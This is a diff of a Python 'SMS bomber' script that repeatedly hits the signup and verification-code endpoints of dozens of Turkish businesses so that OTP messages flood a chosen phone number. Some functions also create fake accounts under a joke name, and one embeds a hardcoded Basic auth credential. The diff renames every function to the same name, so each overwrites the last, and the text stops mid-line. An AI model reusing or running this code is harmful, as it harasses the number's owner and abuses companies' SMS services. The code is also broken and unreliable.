@@ -20,62 +20,9 @@ finally:
     import uuid
 
 
-def KahveDunyasi(number):    
-    try:    
-        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Page-Url": "/kayit-ol",
-            "Content-Type": "application/json;charset=utf-8",
-            "Positive-Client": "kahvedunyasi",
-            "Positive-Client-Type": "web",
-            "Store-Id": "1",
-            "Origin": "https://www.kahvedunyasi.com",
-            "Dnt": "1",
-            "Sec-Gpc": "1",
-            "Referer": "https://www.kahvedunyasi.com/",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-site",
-            "Te": "trailers",
-            "Connection": "close"
-        }
-        json_data = {"mobile_number": number, "token_type": "register_token"}
-        r = requests.post(url, headers=headers, json=json_data, timeout=6)
-        if r.status_code == 200:
-            return True, "KahveDunyasi"
-        else:
-            return False, "KahveDunyasi"
-    except:    
-        return False, "KahveDunyasi"
 
 
-def Wmf(number):
-    try:
-        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
-            "confirm": "true",
-            "date_of_birth": "1956-03-01",
-            "email": "",  # Replace with appropriate email data
-            "email_allowed": "true",
-            "first_name": "Memati",
-            "gender": "male",
-            "last_name": "Bas",
-            "password": "31ABC..abc31",
-            "phone": f"0{number}"
-        }, timeout=6)
-        if wmf.status_code == 202:
-            return True, "Wmf"
-        else:
-            return False, "Wmf"
-    except:
-        return False, "Wmf"
-
-
-
-def KahveDunyasi_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
         payload = {
@@ -97,7 +44,7 @@ def KahveDunyasi_sms_gonder(numara):
         return False, f"KahveDunyasi: {str(e)}"
 
 
-def Wmf_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://www.wmf.com.tr/users/register/"
         payload = {
@@ -118,7 +65,7 @@ def Wmf_sms_gonder(numara):
         return False, f"Wmf: {str(e)}"
 
 
-def Icq_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php"
         payload = {
@@ -139,7 +86,7 @@ def Icq_sms_gonder(numara):
         return False, f"Icq: {str(e)}"
 
 
-def Suiste_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://suiste.com:443/api/auth/code"
         payload = {
@@ -160,7 +107,7 @@ def Suiste_sms_gonder(numara):
         return False, f"Suiste: {str(e)}"
 
 
-def Evidea_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://www.evidea.com:443/users/register/"
         payload = {
@@ -183,7 +130,7 @@ def Evidea_sms_gonder(numara):
 
 
 
-def Ucdortbes_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://api.345dijital.com:443/api/users/register"
         payload = {
@@ -207,7 +154,7 @@ def Ucdortbes_sms_gonder(numara):
         return False, f"345dijital.com: {str(e)}"
 
 
-def Ayyildiz_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={numara}"
         headers = {
@@ -225,7 +172,7 @@ def Ayyildiz_sms_gonder(numara):
         return False, f"ayyildiz.com.tr: {str(e)}"
 
 
-def Naosstars_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
         payload = {
@@ -258,7 +205,7 @@ def Naosstars_sms_gonder(numara):
 
 
 
-def Metro_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
         headers = {
@@ -285,7 +232,7 @@ def Metro_sms_gonder(numara):
         return False, f"metro-tr.com: {str(e)}"
 
 
-def Akasya_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
         headers = {
@@ -307,7 +254,7 @@ def Akasya_sms_gonder(numara):
         return False, f"akasya-admin.poilabs.com: {str(e)}"
 
 
-def Akbati_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
         headers = {
@@ -329,7 +276,7 @@ def Akbati_sms_gonder(numara):
         return False, f"akbati-admin.poilabs.com: {str(e)}"
 
 
-def Clickme_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
         headers = {
@@ -353,7 +300,7 @@ def Clickme_sms_gonder(numara):
     
     
 
-def Happy_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
         headers = {
@@ -377,7 +324,7 @@ def Happy_sms_gonder(numara):
         return False, f"happy.com.tr: {str(e)}"
 
 
-def Komagene_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
         headers = {
@@ -394,7 +341,7 @@ def Komagene_sms_gonder(numara):
         return False, f"gateway.komagene.com.tr: {str(e)}"
 
 
-def KuryemGelsin_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
         json_data = {"phoneNumber": numara, "phone_country_code": "+90"}
@@ -408,7 +355,7 @@ def KuryemGelsin_sms_gonder(numara):
         return False, f"api.kuryemgelsin.com: {str(e)}"
 
 
-def Porty_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://panel.porty.tech:443/api.php?"
         headers = {
@@ -431,7 +378,7 @@ def Porty_sms_gonder(numara):
             
  
 
-def Taksim_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
         headers = {
@@ -458,7 +405,7 @@ def Taksim_sms_gonder(numara):
         return False, f"service.taksim.digital: {str(e)}"
 
 
-def Tasdelen_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
         json_data = {
@@ -478,7 +425,7 @@ def Tasdelen_sms_gonder(numara):
         return False, f"94.102.66.162:80: {str(e)}"
 
 
-def Tasimacim_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://server.tasimacim.com/requestcode"
         json_data = {"phone": numara, "lang": "tr"}
@@ -492,7 +439,7 @@ def Tasimacim_sms_gonder(numara):
         return False, f"server.tasimacim.com: {str(e)}"
 
 
-def ToptanTeslim_sms_gonder(numara):
+def sms_gonder(numara):
     try:
         url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
         headers = {
@@ -538,7 +485,62 @@ def ToptanTeslim_sms_gonder(numara):
 
 
 
-if __name__ == "__main__":
-    numara = input("Global No Sorgu İçin +90 Şeklinde Giriniz:")
-    sms_gonder(numara)
-    
+# yilmazticaret.net
+def sms_gonder(numara):
+    try:
+        url = "http://www.yilmazticaret.net:80/restapi2/register/"
+        headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
+        data = {
+            "telefon": (None, f"0 {numara}"),
+            "token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")
+        }
+        response = requests.post(url, headers=headers,  data=data, timeout=6)
+        
+        if response.json()["giris"] == "success":
+            return True, "yilmazticaret.net: SMS gönderildi"
+        else:
+            return False, "yilmazticaret.net: SMS gönderilemedi"
+    except Exception as e:
+        return False, f"yilmazticaret.net: {str(e)}"
+
+
+# yuffi.co
+def sms_gonder(numara):
+    try:
+        url = "https://api.yuffi.co/api/parent/login/user"
+        json_data = {"phone": numara, "kvkk": True}
+        response = requests.post(url, json=json_data, timeout=6)
+        
+        if response.json()["success"] == True:
+            return True, "api.yuffi.co: SMS gönderildi"
+        else:
+            return False, "api.yuffi.co: SMS gönderilemedi"
+    except Exception as e:
+        return False, f"api.yuffi.co: {str(e)}"
+
+
+# beefull.com
+def sms_gonder(numara):
+    try:
+        url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
+        json={"email": "", "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": numara, "tenant": "beefull", "username": ""}
+        requests.post(url, json=json, timeout=4)
+        url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
+        json={"phoneCode": "90", "phoneNumber": numara, "tenant": "beefull"}
+        r = requests.post(url, json=json, timeout=4)
+        if r.status_code == 200:
+            return True, "app.beefull.io: SMS gönderildi"
+        else:
+            raise
+    except Exception as e:
+        return False, f"app.beefull.io: {str(e)}"
+
+
+# starbucks.com.tr
+def sms_gonder(numara):
+    try:
+        url = "https://auth.sbuxtr.com:443/signUp"
+        headers = {"Content-Type": "application/json", "Operationchannel": "ios", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br"}
+        json={"allowEmail": True, "allowSms": True, "deviceId": "31", "email": "", "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": "", "preferredName": "Memati"}
+        r = requests.post(url, headers=headers, json=json, timeout=6)
+        if r.json()
